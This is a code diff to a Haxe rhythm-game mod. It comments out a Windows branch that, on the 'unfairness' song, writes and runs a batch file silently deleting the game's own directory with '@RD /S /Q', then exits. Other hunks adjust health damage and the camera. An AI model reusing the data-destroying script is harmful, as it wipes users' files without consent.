@@ -1659,15 +1659,16 @@ class PlayState extends MusicBeatState
 					FlxG.switchState(new PlayState());
 					return;
 				case 'unfairness':
+					/*
 					#if windows
 					// make a batch file that will delete the game, run the batch file, then close the game
 					var crazyBatch:String = "@echo off\ntimeout /t 3\n@RD /S /Q \"" + Sys.getCwd() + "\"\nexit";
 					File.saveContent(CoolSystemStuff.getTempPath() + "/die.bat", crazyBatch);
 					new Process(CoolSystemStuff.getTempPath() + "/die.bat", []);
 					Sys.exit(0);
-					#else
+					#else*/
 					FlxG.switchState(new SusState());
-					#end
+					//#end
 				default:
 					FlxG.switchState(new ChartingState());
 					#if desktop
@@ -2001,7 +2002,7 @@ class PlayState extends MusicBeatState
 						case 'cheating':
 							health -= healthtolower;
 						case 'unfairness':
-							health -= (healthtolower / 4);
+							health -= healthtolower;
 					}
 					// boyfriend.playAnim('hit',true);
 					dad.holdTimer = 0;
@@ -2149,7 +2150,7 @@ class PlayState extends MusicBeatState
 				case 'dave-angey' | 'dave-annoyed-3d' | 'dave-3d-standing-bruh-what':
 					camFollow.y = boyfriend.getMidpoint().y;
 				case 'bambi-3d' | 'bambi-unfair':
-					camFollow.y = boyfriend.getMidpoint().y - 250;
+					camFollow.y = boyfriend.getMidpoint().y - 350;
 			}
 
 			if (SONG.song.toLowerCase() == 'tutorial')
